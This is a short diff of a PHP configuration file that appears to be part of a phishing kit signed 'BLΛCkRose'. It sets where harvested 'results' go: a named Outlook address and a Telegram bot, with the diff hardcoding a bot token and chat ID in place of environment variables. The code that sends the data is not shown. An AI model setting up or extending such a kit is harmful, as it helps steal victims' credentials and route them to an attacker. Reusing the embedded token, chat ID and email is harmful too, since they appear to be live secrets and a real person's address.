@@ -2,20 +2,24 @@
 
 /* 📧 Set Your Email Address to Receive Results in Your Inbox */
 $Your_Mail = "danyellekurtz.conway@outlook.com";
+/* --------------------------  */
+
 
 /* 🤖 Telegram Bot Setup 🤖 */
 
-// 🗝️ Retrieve your bot's token from environment variable
-$botToken = getenv('BOT_TOKEN'); // Replace 'BOT_TOKEN' with the actual name of your environment variable
+// 🗝️ Enter your bot's token as a string
+$botToken = "7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg";
 
-// 💬 Retrieve your chat ID from environment variable
-$chatId = getenv('CHAT_ID'); // Replace 'CHAT_ID' with the actual name of your environment variable
+// 💬 Enter your chat ID as a string or number
+$chatId = "7296145278";
 
 /* --------------------------------------------------- */
 
 /* If you want to send results to Telegram, set to 'on'. To stop, set to 'off'. :) */
-$botToken_0 = "on";
-$chatId_0 = "on";
+$botToken_0 = "on";  // You can also use 'true' for booleans
+$chatId_0 = "on";    // You can also use 'true' for booleans
+/* --------------------------  */
+
 
 /* ⚡️⚡️ BLΛCkRose ♣️ - Official Coder ⚡️⚡️ */
 
